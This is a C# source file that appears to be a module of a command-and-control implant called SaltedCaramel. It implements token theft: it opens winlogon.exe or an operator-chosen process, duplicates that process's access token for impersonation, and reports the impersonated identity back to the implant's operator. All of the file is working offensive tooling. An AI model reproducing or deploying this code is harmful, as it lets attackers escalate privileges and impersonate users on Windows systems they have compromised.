using Microsoft.Win32.SafeHandles;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace SaltedCaramel
{
    class Token
    {
        internal static IntPtr stolenHandle;

        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        public static void StealToken(SCTask task, SCImplant implant)
        {
            int procId = 0;
            SafeWaitHandle procHandle;
            if (task.@params == "")
            {
                Process winlogon = Process.GetProcessesByName("winlogon")[0];
                procHandle = new SafeWaitHandle(winlogon.Handle, true);
                Debug.WriteLine("[+] StealToken - Got handle to winlogon.exe at PID: " + winlogon.Id);
            }
            else
            {
                procId = Convert.ToInt32(task.@params);
                procHandle = new SafeWaitHandle(Process.GetProcessById(procId).Handle, true);
            }
            IntPtr tokenHandle = IntPtr.Zero; // Stores the handle for the original process token
            stolenHandle = IntPtr.Zero; // Stores the handle for our duplicated token

            try
            {
                Debug.WriteLine("[+] StealToken - Got handle to process: " + procId);

                try
                {
                    bool procToken = Win32.OpenProcessToken(procHandle.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, out tokenHandle);

                    if (!procToken) // Check if OpenProcessToken was successful
                        throw new Exception(Marshal.GetLastWin32Error().ToString());

                    Debug.WriteLine("[+] StealToken - OpenProcessToken: " + procToken);


                    try
                    {
                        bool duplicateToken = Win32.DuplicateTokenEx(tokenHandle, (uint)TokenAccessLevels.MaximumAllowed, IntPtr.Zero, (uint)TokenImpersonationLevel.Impersonation,
                            Win32.TOKEN_TYPE.TokenImpersonation, out stolenHandle);

                        if (!duplicateToken) // Check if DuplicateTokenEx was successful
                            throw new Exception(Marshal.GetLastWin32Error().ToString());

                        Debug.WriteLine("[+] StealToken - DuplicateTokenEx: " + duplicateToken);
                        Debug.WriteLine("[+] StealToken successful, got token with handle: " + stolenHandle);

                        WindowsIdentity ident = new WindowsIdentity(stolenHandle);
                        implant.PostResponse(new SCTaskResp("Successfully impersonated " + ident.Name, task.id));
                        ident.Dispose();
                        implant.SendComplete(task.id);
                    }
                    catch (Exception e) // Catch errors thrown by DuplicateTokenEx
                    {
                        Debug.WriteLine("[!] StealToken - ERROR duplicating token: " + e.Message);
                        implant.SendError(task.id, e.Message);
                    }
                }
                catch (Exception e) // Catch errors thrown by OpenProcessToken
                {
                    Debug.WriteLine("[!] StealToken - ERROR creating token handle: " + e.Message);
                    implant.SendError(task.id, e.Message);
                }
            }
            catch (Exception e) // Catch errors thrown by Process.GetProcessById
            {
                Debug.WriteLine("[!] StealToken - ERROR creating process handle: " + e.Message);
                implant.SendError(task.id, e.Message);
            }

        }

        internal static void Revert()
        {
            CloseHandle(stolenHandle);
            stolenHandle = IntPtr.Zero;
        }
    }
}
